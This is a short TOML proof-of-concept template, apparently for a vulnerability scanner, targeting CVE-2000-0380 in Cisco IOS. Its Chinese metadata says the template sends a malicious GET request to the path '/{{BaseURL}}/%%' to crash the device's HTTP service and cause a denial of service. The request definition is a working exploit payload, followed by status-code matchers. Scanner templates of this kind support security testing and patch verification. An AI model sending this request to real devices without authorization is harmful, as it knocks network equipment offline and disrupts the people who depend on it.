[info]
author = "ave"
description = "向 Cisco IOS 设备 HTTP 服务发送包含 %% 的恶意 GET 请求，触发 HTTP 服务进程崩溃导致拒绝服务"
id = "POC-AVE-2000-0315"
name = "Cisco IOS HTTP %% 拒绝服务漏洞 PoC"
severity = "high"
tags = ["ave-2000-0315"]
vuln_id = [
    "CVE-2000-0380",
    "AVE-2000-0315",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/%%"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    401,
    403,
    404,
]
type = "status"
